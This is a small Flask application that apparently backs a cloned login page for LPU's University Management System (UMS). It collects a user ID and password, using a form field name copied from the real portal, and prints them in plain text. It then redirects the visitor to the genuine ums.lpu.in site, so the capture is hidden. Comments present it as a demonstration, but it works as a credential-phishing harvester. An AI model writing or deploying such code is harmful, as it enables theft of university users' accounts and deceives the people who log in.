from flask import Flask, request, jsonify, render_template, redirect, url_for
import time
app = Flask(__name__)

@app.route("/")
def home():
    # Serve your HTML form
    return render_template("UMS_LPU.html")  # Ensure UMS_LPU.html is in the `templates` folder.

@app.route("/submit", methods=["POST"])
def submit_form():
    # Retrieve form data
    user_type = request.form.get("dropdown")
    user_id = request.form.get("txtU")
    password = request.form.get("TxtpwdAutoId_8767")
    dashboard_option = request.form.get("dashboard")

    # Process data or perform any operations (e.g., authentication, logging, etc.)
    # Here, we'll just send back the received data for demonstration.
    print("Form submitted with data:")
    print(f"User Type: {user_type}")
    print(f"User ID: {user_id}")
    print(f"Password: {password}")
    print(f"Dashboard Option: {dashboard_option}")

    time.sleep(10)  # Simulating some delay, like database operations or authentication

    # Redirect user to a new page after submission (success page)
    return redirect(url_for('success'))

@app.route("/success")
def success():
    # Show success message after redirection
    return redirect("https://ums.lpu.in/lpuums/")

if __name__ == "__main__":
    app.run(debug=True)
